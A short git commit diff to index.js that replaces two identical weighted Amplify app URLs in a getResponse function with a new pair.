0dbd98c5475df6386064c3a2d59e23cba4063f38
animalinside <akshay.anand12@yahoo.com>
2026-05-17 12:12:04 +0530

    Update URLs in getResponse function

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://main.d22ca7jtt73fif.amplifyapp.com/", weight: 0.5 },
-        { url: "https://main.d22ca7jtt73fif.amplifyapp.com/", weight: 0.5 }
+        { url: "https://main.d33qpgwx2nggqp.amplifyapp.com/", weight: 0.5 },
+        { url: "https://main.d33qpgwx2nggqp.amplifyapp.com/", weight: 0.5 }
       
     ];
 
